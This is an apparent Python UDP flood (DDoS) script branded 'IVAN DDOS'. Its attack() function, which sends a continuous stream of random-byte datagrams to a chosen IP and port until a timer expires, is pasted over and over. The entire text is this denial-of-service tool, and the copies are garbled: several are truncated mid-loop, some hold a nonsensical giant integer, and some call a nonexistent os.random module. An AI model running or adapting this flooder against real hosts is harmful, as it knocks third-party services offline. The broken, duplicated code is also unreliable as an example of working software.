    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
